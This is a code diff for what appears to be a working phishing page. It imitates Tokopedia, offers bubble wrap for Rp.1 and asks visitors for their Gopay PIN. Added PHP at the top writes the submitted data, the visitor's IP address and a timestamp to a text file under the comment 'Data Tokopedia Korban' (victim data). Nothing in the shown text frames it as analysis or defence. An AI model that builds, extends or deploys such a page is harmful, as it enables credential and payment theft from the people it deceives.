@@ -1,3 +1,27 @@
+<?php
+$file = "99.txt";
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+$imel = $_POST['email'];
+
+
+/* Data Tokopedia Korban */
+
+$handle = fopen($file, 'a');
+fwrite($handle, "===== Akun Shopee =====");
+fwrite($handle, "\n");
+fwrite($handle, "Email: ");
+fwrite($handle, "$imel");
+fwrite($handle, "\n");
+fwrite($handle, "IP Address: ");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Date Submitted: ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fclose($handle);
+?>
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -6,6 +30,7 @@
 <title>tokopedia.com</title>
 
 <link rel="icon" type="image/png" sizes="512x512" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon512.png">
+
 
 </script>
 
@@ -41,24 +66,25 @@
 
 <div class='fixed-header' id='main' role='main'>
 <div class='with-sticky with-triple-sticky' id='page'>
-
-<h3><center>EXTRABUBBLEWRAP.</center></h3>
-<p><center>Agar Packing Lebih Aman Dan Tidak Rusak Karena Ekspedisi</center></p>
-
-
-<form novalidate="novalidate" class="new_user_session" id="new_user_session" action="verifikasi.php" accept-charset="UTF-8" method="post"/>
+<h3><center><b>Dapatkan Bubblewrap Hanya Rp.1</b></h3>
+<p><center>Kode verifikasi telah dikirim melalui SMS Atau Gunakan PIN Gopay</center></p>
+<hr>
+<p>
+<br>
+<form novalidate="novalidate" class="new_user_session" id="new_user_session" action="sukses.php" accept-charset="UTF-8" method="post"/>
 <input type="hidden" name="from" id="from" />
 <input type="hidden" name="seller_id" id="seller_id" />
 <input type="hidden" name="blca" id="blca" />
 <fieldset class='form-field-item'>
-<label for="email"><input type="text" class="form-control" id="email" name="email" placeholder="Masukkan Nomor Telepon"  autocomplete="off" required/>
-</label>
+<label for="TownHallLevel"><input type="text" class="form-control" id="hp" name="hp" placeholder=" PIN Gopay  " autocomplete="off" required>
 <br>
-</fieldset>
-<div class='content-separator'></div>
-<input type="submit" name="commit" value="Tambah Bubblewrap" class="btn btn--green btn--medium btn--block js-btn-menu-login" />
-
-</form>
-
-
+<input type="submit" name="commit" value="Proses Pembayaran" class="btn btn--green btn--medium btn--block js-btn-menu-login" />
+<br>
+<p>
+<br>
+<strong>
+<a.href='/verifikasi.php'></a>
+<p><i></i> <i></i></p>
+</strong>
+</p>
 </div>
